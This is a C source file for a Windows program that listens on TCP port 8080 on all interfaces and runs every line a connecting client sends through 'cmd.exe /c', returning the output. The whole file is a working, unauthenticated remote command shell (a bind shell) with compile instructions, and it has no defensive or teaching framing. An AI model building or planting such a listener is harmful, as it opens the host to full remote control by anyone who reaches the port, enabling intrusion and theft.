// win_command_server_loop.c
// Compile (MinGW): gcc win_command_server_loop.c -o server.exe -lws2_32
// Compile (MSVC): cl win_command_server_loop.c ws2_32.lib

#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8080
#define BACKLOG 5
#define RECV_BUF 4096
#define OUT_BUF 4096
#define END_MARKER "\n--END-OF-OUTPUT--\n"

typedef struct {
    SOCKET sock;
} client_arg_t;

static int recv_line(SOCKET s, char *out, int maxlen) {
    // Read until newline '\n' (include partials). Return bytes in out (excluding newline).
    int total = 0;
    while (total < maxlen - 1) {
        char ch;
        int r = recv(s, &ch, 1, 0);
        if (r == 0) return 0;        // connection closed
        if (r < 0) return -1;       // error
        if (ch == '\r') continue;   // ignore CR
        if (ch == '\n') {
            out[total] = '\0';
            return total;
        }
        out[total++] = ch;
    }
    out[maxlen-1] = '\0';
    return total;
}

DWORD WINAPI client_thread(LPVOID arg) {
    client_arg_t *carg = (client_arg_t*)arg;
    SOCKET s = carg->sock;
    free(carg);

    struct sockaddr_in peer;
    int peerlen = sizeof(peer);
    if (getpeername(s, (struct sockaddr*)&peer, &peerlen) == 0) {
        char *ip = inet_ntoa(peer.sin_addr);
        printf("[+] Connected: %s:%d\n", ip, ntohs(peer.sin_port));
    } else {
        printf("[+] Connected: (unknown client)\n");
    }

    char cmdbuf[RECV_BUF];
    for (;;) {
        int n = recv_line(s, cmdbuf, sizeof(cmdbuf));
        if (n == 0) {
            printf("[-] Client disconnected\n");
            break;
        }
        if (n < 0) {
            printf("[-] recv error: %d\n", WSAGetLastError());
            break;
        }

        if (cmdbuf[0] == '\0') {
            // ignore empty command (client pressed enter)
            continue;
        }

        printf("[>] Command: %s\n", cmdbuf);

        // Build command for cmd.exe
        char fullcmd[RECV_BUF + 32];
        snprintf(fullcmd, sizeof(fullcmd), "cmd.exe /c %s", cmdbuf);

        // Execute and stream output
        FILE *fp = _popen(fullcmd, "r");
        if (fp == NULL) {
            const char *err = "Failed to run command\n" END_MARKER;
            send(s, err, (int)strlen(err), 0);
            continue;
        }

        char out[OUT_BUF];
        while (fgets(out, sizeof(out), fp) != NULL) {
            size_t tosend = strlen(out);
            size_t sent = 0;
            while (sent < tosend) {
                int r = send(s, out + sent, (int)(tosend - sent), 0);
                if (r == SOCKET_ERROR) {
                    printf("[-] send error: %d\n", WSAGetLastError());
                    break;
                }
                sent += r;
            }
            if (sent < tosend) break; // send failed
        }
        _pclose(fp);

        // send end marker
        send(s, END_MARKER, (int)strlen(END_MARKER), 0);

        // ready for next command
    }

    shutdown(s, SD_BOTH);
    closesocket(s);
    return 0;
}

int main(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        fprintf(stderr, "WSAStartup failed\n");
        return 1;
    }

    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) {
        fprintf(stderr, "socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    BOOL opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listen_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        fprintf(stderr, "bind() failed: %d\n", WSAGetLastError());
        closesocket(listen_sock);
        WSACleanup();
        return 1;
    }

    if (listen(listen_sock, BACKLOG) == SOCKET_ERROR) {
        fprintf(stderr, "listen() failed: %d\n", WSAGetLastError());
        closesocket(listen_sock);
        WSACleanup();
        return 1;
    }

    printf("[*] Server listening on port %d\n", PORT);

    while (1) {
        struct sockaddr_in client_addr;
        int client_len = sizeof(client_addr);
        SOCKET client = accept(listen_sock, (struct sockaddr*)&client_addr, &client_len);
        if (client == INVALID_SOCKET) {
            fprintf(stderr, "accept() failed: %d\n", WSAGetLastError());
            Sleep(100);
            continue;
        }

        client_arg_t *carg = (client_arg_t*)malloc(sizeof(client_arg_t));
        carg->sock = client;
        HANDLE h = CreateThread(NULL, 0, client_thread, carg, 0, NULL);
        if (h) CloseHandle(h);
        else {
            fprintf(stderr, "Failed to create thread\n");
            closesocket(client);
            free(carg);
        }
    }

    closesocket(listen_sock);
    WSACleanup();
    return 0;
}
